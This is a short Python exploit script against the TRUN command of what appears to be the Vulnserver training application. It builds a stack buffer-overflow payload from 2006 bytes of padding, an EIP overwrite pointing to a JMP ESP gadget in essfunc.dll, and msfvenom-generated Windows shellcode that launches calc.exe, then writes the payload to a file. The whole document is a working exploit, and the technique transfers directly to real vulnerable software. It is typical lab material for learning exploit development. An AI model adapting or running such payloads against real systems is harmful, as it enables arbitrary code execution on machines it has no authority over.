#!/usr/bin/env python3
# -*- coding: utf-8 -*-

buf = b'.'
buf += b'A'*2006 # buffer

buf += b'\xaf\x11\x50\x62' # EIP; JMP ESP at 625011AF in essfunc.dll

#buf+='C'*2000 # space for shellcode
# Generated with: msfvenom -p windows/exec CMD=calc.exe -f python -b '\x00'
buf += b"\xd9\xcb\xbd\x1a\xe4\x34\x1e\xd9\x74\x24\xf4\x5a\x02"
buf += b"\xc9\xb1\x31\x31\x6a\x18\x03\x6a\x18\x83\xc2\x1e\x06"
buf += b"\xc1\xe2\xf6\x44\x2a\x1b\x06\x29\xa2\xfe\x37\x69\xd0"
buf += b"\x8b\x67\x59\x92\xde\x8b\x12\xf6\xca\x18\x56\xdf\xfd"
buf += b"\xa9\xdd\x39\x33\x2a\x4d\x79\x52\xa8\x8c\xae\xb4\x91"
buf += b"\x5e\xa3\xb5\xd6\x83\x4e\xe7\x8f\xc8\xfd\x18\xa4\x85"
buf += b"\x3d\x92\xf6\x08\x46\x47\x4e\x2a\x67\xd6\xc5\x75\xa7"
buf += b"\xd8\x0a\x0e\xee\xc2\x4f\x2b\xb8\x79\xbb\xc7\x3b\xa8"
buf += b"\xf2\x28\x97\x95\x3b\xdb\xe9\xd2\xfb\x04\x9c\x2a\xf8"
buf += b"\xb9\xa7\xe8\x83\x65\x2d\xeb\x23\xed\x95\xd7\xd2\x22"
buf += b"\x43\x93\xd8\x8f\x07\xfb\xfc\x0e\xcb\x77\xf8\x9b\xea"
buf += b"\x57\x89\xd8\xc8\x73\xd2\xbb\x71\x25\xbe\x6a\x8d\x35"
buf += b"\x61\xd2\x2b\x3d\x8f\x07\x46\x1c\xc5\xd6\xd4\x1a\x0a"
buf += b"\xd9\xe6\x24\x9b\xb1\xd7\xaf\x74\xc5\xe7\x65\x31\x39"
buf += b"\xa2\x24\x13\xd2\x6b\xbd\x26\xbf\x8b\x6b\x64\xc6\x0f"
buf += b"\x9e\x14\x3d\x0f\xeb\x11\x79\x97\x07\x6b\x12\x72\x28"
buf += b"\xd8\x13\x57\x4b\xbf\x87\x3b\xa2\x5a\x20\xd9\xba"

content = b'TRUN '+buf

with open('TRUNshellcode_test.txt', "wb") as f:
    f.write(content)